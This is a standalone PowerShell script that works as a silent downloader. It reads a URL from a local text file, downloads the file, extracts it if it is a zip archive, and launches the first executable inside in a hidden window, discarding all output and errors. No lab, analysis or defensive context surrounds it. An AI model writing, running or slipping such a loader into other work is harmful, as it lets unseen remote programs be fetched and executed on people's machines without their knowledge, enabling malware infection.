

try {
    # Get the directory where the script is located
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

    # Path to link.txt
    $linkFile = Join-Path $scriptDir "output1.txt"

    # Read the URL from the file
    $url = (Get-Content $linkFile -ErrorAction SilentlyContinue).Trim()

    if (-not $url) { return }

    # Get the file name from the URL
    $fileName = Split-Path $url -Leaf

    # Set output path (same directory)
    $outputPath = Join-Path $scriptDir $fileName

    # Download the file silently
    Invoke-WebRequest -Uri $url -OutFile $outputPath *>$null

    # Check if the file is a .zip
    if ($fileName.ToLower().EndsWith(".zip")) {
        $extractPath = Join-Path $scriptDir "extracted"

        # Create extraction folder if it doesn't exist
        if (-not (Test-Path $extractPath)) {
            New-Item -ItemType Directory -Path $extractPath *>$null | Out-Null
        }

        # Extract the zip silently
        Expand-Archive -Path $outputPath -DestinationPath $extractPath -Force *>$null

        # Find the first .exe file in the extracted folder (recursively)
        $exeFile = Get-ChildItem -Path $extractPath -Recurse -Filter *.exe -ErrorAction SilentlyContinue | Select-Object -First 1

        if ($exeFile) {
            # Launch the first exe silently (console hidden)
            Start-Process $exeFile.FullName -WindowStyle Hidden
        }
    }
}
catch {
    # Suppress all errors silently
    $null
}
